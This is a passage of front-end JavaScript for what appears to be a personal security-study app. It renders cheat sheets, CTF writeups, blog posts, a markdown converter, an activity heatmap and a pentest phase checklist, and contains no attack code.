    if(!sheets.find(s=>s.id===ds.id)){sheets.push({...ds,isDefault:true});}
  }
  saveSheets();
}
const saveSheets=()=>localStorage.setItem(K+'_sheets',JSON.stringify(sheets));
function loadWriteups(){
  try{writeups=JSON.parse(localStorage.getItem(K+'_writeups')||'[]')}catch{writeups=[]}
}
const saveWriteups=()=>localStorage.setItem(K+'_writeups',JSON.stringify(writeups));

function goStudy(){
  hideAllViews();
  E('studyView').style.display='block';E('studyView').classList.add('active');
  E('navCrumb').textContent='Study Lab';
  readingBlogId=null;readingWriteupId=null;
  renderStudy();
}
function switchStudySection(sec){
  studySection=sec;
  readingBlogId=null;readingWriteupId=null;
  renderStudy();
}
function renderStudy(){
  // Update section tab active state
  ['sheets','writeups','blog'].forEach(s=>{
    const btn=E('stab-'+s);if(btn)btn.classList.toggle('active',studySection===s);
  });
  if(studySection==='sheets'){renderSheets();return;}
  if(studySection==='writeups'){renderWriteups();return;}
  // blog section
  const heroAction=E('studyHeroAction');
  if(heroAction)heroAction.innerHTML=`<button class="btn btn-primary" onclick="openModal('modalBlog')">
    <svg viewBox="0 0 24 24" style="width:15px;height:15px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg> New Post</button>`;

  // Tabs
  const cats=['all',...Object.keys(BLOG_CATEGORIES)];
  const tabsEl=E('studyTabs');
  if(tabsEl)tabsEl.innerHTML=cats.map(c=>{
    const lbl=c==='all'?'All':BLOG_CATEGORIES[c]?.name||c;
    return`<button class="study-tab${studyCat===c?' active':''}" onclick="studyCat='${c}';readingBlogId=null;renderStudy()">${lbl}</button>`;
  }).join('');

  const contentEl=E('studyContent');if(!contentEl)return;

  if(readingBlogId){
    const blog=studyBlogs.find(b=>b.id===readingBlogId);
    if(blog){
      const catInfo=BLOG_CATEGORIES[blog.cat]||BLOG_CATEGORIES.general;
      const MO=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
      const d=new Date(blog.createdAt||Date.now());
      const dateStr=`${MO[d.getMonth()]} ${d.getDate()}, ${d.getFullYear()}`;
      const tags=(blog.tags||[]).map(t=>`<span class="blog-card-tag">${esc(t)}</span>`).join('');
      const editBtn=!blog.isDefault?`<button class="btn btn-sm" onclick="editBlog('${blog.id}')"><svg viewBox="0 0 24 24" style="width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg> Edit</button>
      <button class="btn btn-danger btn-sm" onclick="deleteBlog('${blog.id}')"><svg viewBox="0 0 24 24" style="width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg> Delete</button>`:'';
      contentEl.innerHTML=`<div class="blog-reader">
        <div class="blog-reader-back" onclick="readingBlogId=null;renderStudy()">
          <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg> Back to all posts
        </div>
        <h1>${esc(blog.title)}</h1>
        <div class="blog-reader-meta">
          <span style="color:${catInfo.color};background:${catInfo.bg};padding:2px 10px;border-radius:12px;font-weight:600;font-size:12px">${catInfo.name}</span>
          <span>${dateStr}</span>
          <span>${tags}</span>
          ${editBtn}
        </div>
        <div class="blog-reader-body">${blog.body}</div>
      </div>`;
      return;
    }
  }

  const filtered=studyCat==='all'?studyBlogs:studyBlogs.filter(b=>b.cat===studyCat);
  const MO=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
  const cards=filtered.map(b=>{
    const catInfo=BLOG_CATEGORIES[b.cat]||BLOG_CATEGORIES.general;
    const d=new Date(b.createdAt||Date.now());
    const dateStr=`${MO[d.getMonth()]} ${d.getDate()}, ${d.getFullYear()}`;
    const tags=(b.tags||[]).slice(0,3).map(t=>`<span class="blog-card-tag">${esc(t)}</span>`).join('');
    return`<div class="blog-card" onclick="readingBlogId='${b.id}';renderStudy()">
      <div class="blog-card-header">
        <div class="blog-card-cat" style="color:${catInfo.color};background:${catInfo.bg}">${catInfo.name}</div>
        <div class="blog-card-title">${esc(b.title)}</div>
        <div class="blog-card-desc">${esc(b.desc||'')}</div>
      </div>
      <div class="blog-card-footer">
        <span>${dateStr}</span>
        <div class="blog-card-tags">${tags}</div>
      </div>
    </div>`;
  }).join('');

  contentEl.innerHTML=filtered.length?`<div class="blog-grid">${cards}</div>`:`<div style="text-align:center;padding:48px;color:var(--t3)"><p style="font-size:16px;margin-bottom:8px">No posts in this category yet</p><p>Click <strong>New Post</strong> to create one.</p></div>`;
}

/* ═══════════ CHEAT SHEETS ═══════════ */
function renderSheets(){
  const heroAction=E('studyHeroAction');
  if(heroAction)heroAction.innerHTML=`<button class="btn btn-primary" onclick="openNewSheet()">
    <svg viewBox="0 0 24 24" style="width:15px;height:15px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg> New Sheet</button>`;
  const tabsEl=E('studyTabs');
  const cats=['all',...Object.keys(SHEET_CATEGORIES)];
  if(tabsEl)tabsEl.innerHTML=cats.map(c=>{
    const lbl=c==='all'?'All':SHEET_CATEGORIES[c]?.name||c;
    return`<button class="study-tab${sheetCat===c?' active':''}" onclick="sheetCat='${c}';renderSheets()">${lbl}</button>`;
  }).join('');
  const contentEl=E('studyContent');if(!contentEl)return;
  const filtered=sheetCat==='all'?sheets:sheets.filter(s=>s.cat===sheetCat);
  if(!filtered.length){contentEl.innerHTML=`<div style="text-align:center;padding:48px;color:var(--t3)"><p style="font-size:16px;margin-bottom:8px">No cheat sheets yet in this category</p><p>Click <strong>New Sheet</strong> to create one.</p></div>`;return;}
  const cards=filtered.map(s=>{
    const catInfo=SHEET_CATEGORIES[s.cat]||SHEET_CATEGORIES.general;
    const editBtns=!s.isDefault
      ?`<button class="btn btn-xs btn-ghost" onclick="event.stopPropagation();editSheet('${s.id}')">Edit</button>
         <button class="btn btn-xs btn-danger" onclick="event.stopPropagation();deleteSheet('${s.id}')">Del</button>`
      :'';

    /* syntax-colour a line of code */
    function colourLine(rawLine){
      const e=esc(rawLine);
      // full-line comment
      if(/^#/.test(rawLine.trimStart())) return`<span class="sh-comment">${e}</span>`;
      // inline flag/option -x --xxx
      return e
        .replace(/((?:^|\s)(?:-{1,2}[\w-]+))/g,'<span class="sh-flag">$1</span>')
        .replace(/(&lt;[^&]*&gt;)/g,'<span class="sh-str">$1</span>');
    }

    const blocks=s.content.split(/\n(?=\[)/g).map((block,bi)=>{
      const lines=block.split('\n');
      const heading=lines[0].match(/^\[(.+)\]$/)?.[1];
      const codeLines=(heading?lines.slice(1):lines);
      const codeContent=codeLines.join('\n').trim();
      if(!codeContent)return'';
      const colored=codeLines.map(l=>colourLine(l)).join('\n');
      if(heading){
        return`<div class="sheet-code-section">
          <div class="sheet-section-label">${esc(heading)}
            <button class="sheet-copy-inline" onclick="event.stopPropagation();copySheetBlock(this,'${s.id}',${bi})">Copy</button>
          </div>
          <pre class="sheet-pre">${colored}</pre>
        </div>`;
      }
      return`<div class="sheet-code-section"><pre class="sheet-pre">${colored}</pre></div>`;
    }).join('');

    return`<div class="sheet-editor-card" id="sc-${s.id}">
      <div class="sheet-editor-header">
        <div class="sheet-editor-dots">
          <div class="sheet-editor-dot r"></div>
          <div class="sheet-editor-dot y"></div>
          <div class="sheet-editor-dot g"></div>
        </div>
        <div class="sheet-editor-title">${esc(s.title)}</div>
        <span class="sheet-cat-pill" style="color:${catInfo.color};border-color:${catInfo.color}40;background:${catInfo.color}14">${catInfo.name}</span>
        <div class="sheet-editor-actions">${editBtns}</div>
      </div>
      <div class="sheet-code-body">${blocks}</div>
      <div class="sheet-card-footer">
        <span style="font-size:10px;color:var(--t4);font-family:var(--mono)">${codeLines(s.content)} lines</span>
        <button class="sheet-copy-all-btn" onclick="copyFullSheet('${s.id}')">Copy All</button>
      </div>
    </div>`;
  }).join('');
  contentEl.innerHTML=`<div class="sheet-grid">${cards}</div>`;
  function codeLines(c){return c.split('\n').filter(l=>l.trim()&&!l.trim().startsWith('[')).length;}
}
function openNewSheet(){
  E('sheetModalTitle').textContent='New Cheat Sheet';
  E('sheet-title').value='';E('sheet-content').value='';E('sheet-cat').value='web';E('sheet-edit-id').value='';
  openModal('modalSheet');
}
function saveSheet(){
  const te=E('sheet-title');const title=te.value.trim();
  if(!title){te.classList.add('err');te.focus();setTimeout(()=>te.classList.remove('err'),400);return;}
  const editId=E('sheet-edit-id').value;
  if(editId){
    const s=sheets.find(x=>x.id===editId);if(s){s.title=title;s.cat=E('sheet-cat').value;s.content=E('sheet-content').value.trim();}
  }else{
    sheets.push({id:'sh'+Date.now(),title,cat:E('sheet-cat').value,content:E('sheet-content').value.trim(),createdAt:Date.now()});
    grantXP(10,'cheat sheet created');checkAch();
  }
  saveSheets();closeModal('modalSheet');renderSheets();toast('Cheat sheet saved');
}
function editSheet(id){
  const s=sheets.find(x=>x.id===id);if(!s)return;
  E('sheetModalTitle').textContent='Edit Cheat Sheet';
  E('sheet-title').value=s.title;E('sheet-cat').value=s.cat;E('sheet-content').value=s.content;E('sheet-edit-id').value=s.id;
  openModal('modalSheet');
}
function deleteSheet(id){
  sheets=sheets.filter(s=>s.id!==id);saveSheets();renderSheets();toast('Sheet deleted');
}
function copyFullSheet(id){
  const s=sheets.find(x=>x.id===id);if(!s)return;
  navigator.clipboard.writeText(s.content).catch(()=>{});toast('Sheet copied to clipboard');
}
function copySheetBlock(btn,id,blockIdx){
  const s=sheets.find(x=>x.id===id);if(!s)return;
  const blocks=s.content.split(/\n(?=\[)/g);
  const block=blocks[blockIdx]||'';
  const lines=block.split('\n');
  const heading=lines[0].match(/^\[.+\]$/);
  const code=(heading?lines.slice(1):lines).join('\n').trim();
  navigator.clipboard.writeText(code).catch(()=>{});
  const orig=btn.textContent;btn.textContent='Copied!';setTimeout(()=>btn.textContent=orig,1500);
}

/* ═══════════ WRITEUPS ═══════════ */
const WU_CATS={room:'Room',web:'Web',crypto:'Crypto',forensics:'Forensics',osint:'OSINT',network:'Network',misc:'Misc'};
function renderWriteups(){
  const heroAction=E('studyHeroAction');
  if(heroAction)heroAction.innerHTML=`<button class="btn btn-primary" onclick="openNewWriteup()">
    <svg viewBox="0 0 24 24" style="width:15px;height:15px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg> New Writeup</button>`;
  const tabsEl=E('studyTabs');if(tabsEl)tabsEl.innerHTML='';
  const contentEl=E('studyContent');if(!contentEl)return;
  if(readingWriteupId){
    const wu=writeups.find(w=>w.id===readingWriteupId);
    if(wu){
      const MO=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
      const d=new Date(wu.createdAt||Date.now());
      const dateStr=`${MO[d.getMonth()]} ${d.getDate()}, ${d.getFullYear()}`;
      const linked=targets.find(t=>t.id===wu.linkedTarget);
      contentEl.innerHTML=`<div class="blog-reader">
        <div class="blog-reader-back" onclick="readingWriteupId=null;renderWriteups()">
          <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg> Back to writeups
        </div>
        <h1>${esc(wu.title)}</h1>
        <div class="blog-reader-meta">
          <span style="color:var(--accent);background:var(--accentbg);padding:2px 10px;border-radius:12px;font-weight:600;font-size:12px">${esc(wu.platform||'')}</span>
          <span style="color:var(--t2);font-size:13px">${esc(WU_CATS[wu.cat]||wu.cat||'')} · ${esc(wu.difficulty||'')}</span>
          <span style="color:var(--t3);font-size:13px">${dateStr}</span>
          ${linked?`<span style="color:var(--green);font-size:12px">Linked: ${esc(linked.name)}</span>`:''}
          <button class="btn btn-sm btn-ghost" onclick="editWriteup('${wu.id}')">Edit</button>
          <button class="btn btn-sm btn-danger" onclick="deleteWriteup('${wu.id}')">Delete</button>
        </div>
        <div class="blog-reader-body">${markdownToHtml(wu.body||'')}</div>
      </div>`;return;
    }
  }
  if(!writeups.length){
    contentEl.innerHTML=`<div class="writeup-empty">
      <div class="writeup-empty-icon">
        <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
      </div>
      <div style="font-size:15px;font-weight:600;color:var(--t3)">No writeups yet</div>
      <div style="font-size:13px;color:var(--t4)">Document your first solved challenge — methodology, flags, key learnings.</div>
    </div>`;
    return;
  }
  const MO=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
  /* icon per category */
  const catIcon={
    room:`<svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>`,
    web:`<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>`,
    crypto:`<svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>`,
    forensics:`<svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>`,
    osint:`<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>`,
    network:`<svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>`,
    misc:`<svg viewBox="0 0 24 24"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>`
  };
  const diffColor={Easy:'var(--green)',Medium:'var(--amber)',Hard:'var(--red)',Insane:'var(--purple)'};
  const catBgColor={room:'var(--accentbg)',web:'rgba(103,232,249,.1)',crypto:'rgba(251,191,36,.1)',forensics:'rgba(52,211,153,.1)',osint:'rgba(248,113,113,.1)',network:'rgba(167,139,250,.1)',misc:'rgba(139,149,168,.1)'};
  const catColor={room:'var(--accent)',web:'var(--cyan)',crypto:'var(--amber)',forensics:'var(--green)',osint:'var(--red)',network:'var(--purple)',misc:'var(--t3)'};
  const cards=writeups.map(wu=>{
    const d=new Date(wu.createdAt||Date.now());
    const dateStr=`${MO[d.getMonth()]} ${d.getDate()}, ${d.getFullYear()}`;
    const preview=(wu.body||'').replace(/[#*`\[\]]/g,'').trim().slice(0,80);
    const cat=wu.cat||'room';
    const ic=catIcon[cat]||catIcon.misc;
    const iconBg=catBgColor[cat]||'var(--accentbg)';
    const iconColor=catColor[cat]||'var(--accent)';
    const dc=diffColor[wu.difficulty]||'var(--t3)';
    return`<div class="writeup-card" onclick="readingWriteupId='${wu.id}';renderWriteups()">
      <div class="writeup-icon" style="background:${iconBg};color:${iconColor}">${ic}</div>
      <div class="writeup-body">
        <div class="writeup-title">${esc(wu.title)}</div>
        <div class="writeup-meta">
          <span class="writeup-badge">${esc(wu.platform||'CTF')}</span>
          <span style="font-size:11px;font-weight:600;color:${dc};font-family:var(--mono)">${esc(wu.difficulty||'')}</span>
          <span style="font-size:11px;color:var(--t3)">${esc(WU_CATS[cat]||cat)}</span>
        </div>
        ${preview?`<div class="writeup-preview" style="margin-top:4px">${esc(preview)}${(wu.body||'').length>80?'…':''}</div>`:''}
      </div>
      <div class="writeup-date">${dateStr}</div>
      <div class="writeup-chevron"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
    </div>`;
  }).join('');
  contentEl.innerHTML=`<div class="writeup-grid">${cards}</div>`;
}
function openNewWriteup(){
  E('writeupModalTitle').textContent='New Writeup';
  E('wu-title').value='';E('wu-body').value='';E('wu-cat').value='room';E('wu-diff').value='Medium';
  E('wu-platform').value='TryHackMe';E('wu-edit-id').value='';
  const upEl=E('wu-md-upload');if(upEl)upEl.value='';
  const fnEl=E('wu-md-filename');if(fnEl)fnEl.textContent='';
  const sel=E('wu-linked');if(sel){sel.innerHTML='<option value="">— None —</option>'+targets.map(t=>`<option value="${t.id}">${esc(t.name)}</option>`).join('');}
  openModal('modalWriteup');
}
function saveWriteup(){
  const te=E('wu-title');const title=te.value.trim();
  if(!title){te.classList.add('err');te.focus();setTimeout(()=>te.classList.remove('err'),400);return;}
  const editId=E('wu-edit-id').value;
  const data={title,platform:E('wu-platform').value,cat:E('wu-cat').value,difficulty:E('wu-diff').value,body:E('wu-body').value.trim(),linkedTarget:E('wu-linked').value||null};
  if(editId){const w=writeups.find(x=>x.id===editId);if(w)Object.assign(w,data);}
  else{writeups.push({id:'wu'+Date.now(),createdAt:Date.now(),...data});grantXP(20,'writeup saved');checkAch();}
  saveWriteups();closeModal('modalWriteup');renderWriteups();toast('Writeup saved');
}
function editWriteup(id){
  const wu=writeups.find(x=>x.id===id);if(!wu)return;
  E('writeupModalTitle').textContent='Edit Writeup';
  E('wu-title').value=wu.title;E('wu-platform').value=wu.platform||'TryHackMe';
  E('wu-cat').value=wu.cat||'room';E('wu-diff').value=wu.difficulty||'Medium';
  E('wu-body').value=wu.body||'';E('wu-edit-id').value=wu.id;
  const sel=E('wu-linked');if(sel){sel.innerHTML='<option value="">— None —</option>'+targets.map(t=>`<option value="${t.id}"${t.id===wu.linkedTarget?' selected':''}>${esc(t.name)}</option>`).join('');}
  openModal('modalWriteup');
}
function deleteWriteup(id){
  writeups=writeups.filter(w=>w.id!==id);saveWriteups();readingWriteupId=null;renderWriteups();toast('Writeup deleted');
}
function importWriteupMd(input){
  const file=input.files[0];if(!file)return;
  const fn=E('wu-md-filename');if(fn)fn.textContent=file.name;
  const reader=new FileReader();
  reader.onload=e=>{
    E('wu-body').value=e.target.result;
    /* pre-fill title from filename if title empty */
    const titleEl=E('wu-title');
    if(titleEl&&!titleEl.value.trim()){
      titleEl.value=file.name.replace(/\.md$/i,'').replace(/[-_]/g,' ');
    }
  };
  reader.readAsText(file);
}

function saveBlogPost(){
  const titleEl=E('blog-title');const title=titleEl.value.trim();
  if(!title){titleEl.classList.add('err');titleEl.focus();setTimeout(()=>titleEl.classList.remove('err'),400);return}
  const cat=E('blog-cat').value;
  const tags=E('blog-tags').value.split(',').map(t=>t.trim()).filter(Boolean);
  const desc=E('blog-desc').value.trim();
  const body=E('blog-body').value.trim();
  const editId=E('blog-edit-id').value;

  // Simple markdown-ish to HTML conversion
  const htmlBody=markdownToHtml(body);

  if(editId){
    const blog=studyBlogs.find(b=>b.id===editId);
    if(blog){blog.title=title;blog.cat=cat;blog.tags=tags;blog.desc=desc;blog.body=htmlBody;blog.updatedAt=Date.now();}
  } else {
    studyBlogs.push({id:'b'+Date.now(),title,cat,tags,desc,body:htmlBody,isDefault:false,createdAt:Date.now()});
    grantXP(15,'blog post created');
  }
  saveBlogs();closeModal('modalBlog');
  ['blog-title','blog-tags','blog-desc','blog-body'].forEach(id=>{const el=E(id);if(el)el.value=''});
  E('blog-edit-id').value='';
  renderStudy();toast(editId?'Blog post updated!':'Blog post published!');
}

function editBlog(id){
  const blog=studyBlogs.find(b=>b.id===id);if(!blog)return;
  E('blog-title').value=blog.title;
  E('blog-cat').value=blog.cat;
  E('blog-tags').value=(blog.tags||[]).join(', ');
  E('blog-desc').value=blog.desc||'';
  E('blog-body').value=htmlToMarkdown(blog.body);
  E('blog-edit-id').value=blog.id;
  E('blogModalTitle').textContent='Edit Blog Post';
  openModal('modalBlog');
}

function deleteBlog(id){
  studyBlogs=studyBlogs.filter(b=>b.id!==id);
  saveBlogs();readingBlogId=null;renderStudy();toast('Blog post deleted');
}

function markdownToHtml(md){
  if(!md)return'';
  let html=md;
  // Protect code blocks from further processing
  const codeBlocks=[];
  html=html.replace(/```(\w*)\n?([\s\S]*?)```/g,(m,lang,code)=>{
    const idx=codeBlocks.length;
    const cls=lang?` class="lang-${lang}"`:'';
    codeBlocks.push(`<pre><code${cls}>${code.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</code></pre>`);
    return`\x00CODE${idx}\x00`;
  });
  // Inline code
  html=html.replace(/`([^`\n]+)`/g,(m,c)=>`<code>${c.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</code>`);
  // Headers
  html=html.replace(/^#### (.+)$/gm,'<h4>$1</h4>');
  html=html.replace(/^### (.+)$/gm,'<h3>$1</h3>');
  html=html.replace(/^## (.+)$/gm,'<h2>$1</h2>');
  html=html.replace(/^# (.+)$/gm,'<h1>$1</h1>');
  // Bold & italic
  html=html.replace(/\*\*\*(.+?)\*\*\*/g,'<strong><em>$1</em></strong>');
  html=html.replace(/\*\*(.+?)\*\*/g,'<strong>$1</strong>');
  html=html.replace(/\*(.+?)\*/g,'<em>$1</em>');
  // Blockquote
  html=html.replace(/^> (.+)$/gm,'<blockquote>$1</blockquote>');
  // Horizontal rule
  html=html.replace(/^(?:---|\*\*\*|___)\s*$/gm,'<hr>');
  // Basic tables (| col | col |)
  html=html.replace(/((?:^\|.+\|\n?)+)/gm,(table)=>{
    const rows=table.trim().split('\n').filter(r=>!/^\|[-| :]+\|/.test(r));
    if(rows.length<1)return table;
    const head=rows[0];const body=rows.slice(1);
    const th=head.split('|').filter((_,i,a)=>i>0&&i<a.length-1).map(c=>`<th>${c.trim()}</th>`).join('');
    const trs=body.map(r=>{const tds=r.split('|').filter((_,i,a)=>i>0&&i<a.length-1).map(c=>`<td>${c.trim()}</td>`).join('');return`<tr>${tds}</tr>`;}).join('');
    return`<table><thead><tr>${th}</tr></thead><tbody>${trs}</tbody></table>`;
  });
  // Unordered lists — collect consecutive items
  html=html.replace(/(^[ \t]*[-*] .+\n?)+/gm,match=>{
    const items=match.trim().split('\n').map(l=>`<li>${l.replace(/^[ \t]*[-*] /,'')}</li>`).join('');
    return`<ul>${items}</ul>\n`;
  });
  // Ordered lists — collect consecutive items
  html=html.replace(/(^[ \t]*\d+\. .+\n?)+/gm,match=>{
    const items=match.trim().split('\n').map(l=>`<li>${l.replace(/^[ \t]*\d+\. /,'')}</li>`).join('');
    return`<ol>${items}</ol>\n`;
  });
  // Paragraphs — wrap blocks that aren't already tagged
  html=html.split(/\n{2,}/).map(block=>{
    block=block.trim();
    if(!block)return'';
    if(/^\x00CODE\d+\x00$/.test(block))return block;
    if(/^<[hupobtrdt]/.test(block))return block;
    // single line breaks become <br>
    return`<p>${block.replace(/\n/g,'<br>')}</p>`;
  }).join('\n');
  // Restore code blocks
  codeBlocks.forEach((c,i)=>{html=html.replace(`\x00CODE${i}\x00`,c)});
  return html;
}

function htmlToMarkdown(html){
  if(!html)return'';
  let md=html;
  md=md.replace(/<pre><code>([\s\S]*?)<\/code><\/pre>/g,'```\n$1```');
  md=md.replace(/<code>([^<]+)<\/code>/g,'`$1`');
  md=md.replace(/<h3>([^<]+)<\/h3>/g,'### $1');
  md=md.replace(/<h2>([^<]+)<\/h2>/g,'## $1');
  md=md.replace(/<h1>([^<]+)<\/h1>/g,'# $1');
  md=md.replace(/<strong>([^<]+)<\/strong>/g,'**$1**');
  md=md.replace(/<em>([^<]+)<\/em>/g,'*$1*');
  md=md.replace(/<blockquote>([^<]+)<\/blockquote>/g,'> $1');
  md=md.replace(/<li>([^<]+)<\/li>/g,'- $1');
  md=md.replace(/<\/?[uop][l]?>/g,'');
  md=md.replace(/<\/?p>/g,'\n');
  md=md.replace(/<[^>]+>/g,'');
  md=md.replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&').replace(/&quot;/g,'"');
  return md.trim();
}

/* ═══════════════ PROFILE ENHANCEMENTS ════ */
/* ═══════════════ UPDATED HEATMAP ══════════ */
function buildHeatmap(){
  const hm={};try{Object.assign(hm,JSON.parse(localStorage.getItem(K+'_hm')||'{}'))}catch{}
  const grid=E('hmGrid'),months=E('hmMonths');
  if(!grid||!months)return;

  const MO=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
  const DAYNAMES=['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
  const joined=localStorage.getItem(K+'_joined');
  const today=new Date();
  const twelveWeeksAgo=new Date(today);
  twelveWeeksAgo.setDate(twelveWeeksAgo.getDate()-(12*7));
  twelveWeeksAgo.setDate(twelveWeeksAgo.getDate()-twelveWeeksAgo.getDay());

  let startDate;
  if(joined){
    const joinedDate=new Date(joined);
    joinedDate.setDate(joinedDate.getDate()-joinedDate.getDay());
    startDate=joinedDate>twelveWeeksAgo?joinedDate:twelveWeeksAgo;
  } else {startDate=twelveWeeksAgo}

  const weeks=[];let cur=new Date(startDate);
  while(cur<=today){const col=[];for(let d=0;d<7;d++){const k=cur.toISOString().slice(0,10);col.push({k,v:hm[k]||0,d:new Date(cur)});cur.setDate(cur.getDate()+1)}weeks.push(col)}

  let lastM=-1;
  months.innerHTML=weeks.map(col=>{const m=col[0].d.getMonth();if(m!==lastM){lastM=m;return`<div class="hm-mo">${MO[m]}</div>`}return`<div class="hm-mo"></div>`}).join('');

  let activeDays=0;
  grid.innerHTML=weeks.map(col=>{
    const cells=col.map(c=>{
      const l=c.v===0?'':c.v<5?'l1':c.v<15?'l2':c.v<30?'l3':'l4';
      if(c.v>0)activeDays++;
      const fd=c.d;
      const dateStr=`${DAYNAMES[fd.getDay()]}, ${MO[fd.getMonth()]} ${fd.getDate()}`;
      const tip=c.v>0?`${c.v} min on ${dateStr}`:`No activity — ${dateStr}`;
      return`<div class="hcell ${l}" data-tip="${tip}"></div>`;
    }).join('');
    return`<div class="hm-col">${cells}</div>`;
  }).join('');
  const stat=E('heatmap-stat');
  if(stat)stat.textContent=`${activeDays} active day${activeDays!==1?'s':''} since you joined`;
  const sl=E('streak-label');
  const streak=getStreak();
  if(sl)sl.textContent=streak>0?`${streak} day streak`:'';

  /* wire up global tooltip after render */
  const hmGrid=E('hmGrid');
  if(hmGrid && !hmGrid._tipBound){
    hmGrid._tipBound=true;
    const tip=document.getElementById('hm-global-tip');
    hmGrid.addEventListener('mouseover',e=>{
      const cell=e.target.closest('.hcell');
      if(!cell||!tip)return;
      tip.textContent=cell.dataset.tip||'';
      tip.classList.add('visible');
    });
    hmGrid.addEventListener('mousemove',e=>{
      if(!tip||!tip.classList.contains('visible'))return;
      const pad=10;
      let x=e.clientX-tip.offsetWidth/2;
      let y=e.clientY-tip.offsetHeight-14;
      /* keep inside viewport */
      x=Math.max(pad,Math.min(x,window.innerWidth-tip.offsetWidth-pad));
      if(y<pad)y=e.clientY+20;
      tip.style.left=x+'px';
      tip.style.top=y+'px';
    });
    hmGrid.addEventListener('mouseout',e=>{
      if(!e.target.closest('.hcell')&&tip)tip.classList.remove('visible');
      if(e.target.classList.contains('hcell')&&!e.relatedTarget?.closest('.hcell')&&tip)tip.classList.remove('visible');
    });
  }
}

/* ═══════════════ CHECKLIST (canonical — phase complete + type sub-checklist) ══ */
function buildChecklist(t){
  const bar=`<div class="cl-toolbar">
    <div class="cl-search-wrap"><div class="cl-search-ico">${IC.search}</div><input class="cl-search" type="text" placeholder="Search steps..." value="${esc(clSearch)}" oninput="clSearch=this.value;debouncedRenderTab()"></div>
    <button class="cl-filt${clFilter==='all'?' active':''}" onclick="clFilter='all';renderTab()">All</button>
    <button class="cl-filt${clFilter==='pending'?' active':''}" onclick="clFilter='pending';renderTab()">To Do</button>
    <button class="cl-filt${clFilter==='done'?' active':''}" onclick="clFilter='done';renderTab()">Done</button>
  </div>`;

  const phasePct=getPhaseCompletionPct(t);

  const phases=PHASES.map(ph=>{
    const items=ph.items.filter(it=>{
      const ms=!clSearch||it.text.toLowerCase().includes(clSearch.toLowerCase())||it.hint.toLowerCase().includes(clSearch.toLowerCase());
      const mf=clFilter==='all'?true:clFilter==='done'?!!(t.checks||{})[it.id]:!(t.checks||{})[it.id];
      return ms&&mf;
    });
    if(!items.length&&(!(!clSearch&&clFilter==='all')))return'';
    const done=ph.items.filter(it=>(t.checks||{})[it.id]).length;
    const allDone=done===ph.items.length;
    const phaseComplete=!!(t.phaseCompleted||{})[ph.id];
    const rows=items.map(it=>buildCheckItem(it,t.checks,t.checkNotes,false)).join('');
    return`<div class="phase-block">
      <div class="phase-toggle" id="pt-${ph.id}" onclick="togglePhase('${ph.id}')">
        <div class="phase-toggle-icon" style="background:${ph.color}1a;color:${ph.color}">${IC[ph.icon]||IC.search}</div>
        <span class="ph-nm">${ph.name}</span>
        <span class="phase-pct">${Math.round(done/ph.items.length*100)}%</span>
        <span class="ph-ct" style="color:${allDone?'var(--green)':'var(--t3)'}">${done}/${ph.items.length}</span>
        <button class="phase-complete-btn${phaseComplete?' completed':''}" onclick="event.stopPropagation();togglePhaseComplete('${ph.id}')" title="${phaseComplete?'Phase completed':'Mark phase as complete'}">
          ${IC.check} ${phaseComplete?'Done':'Complete'}
        </button>
        <span class="ph-chev">${IC.chevron}</span>
      </div>
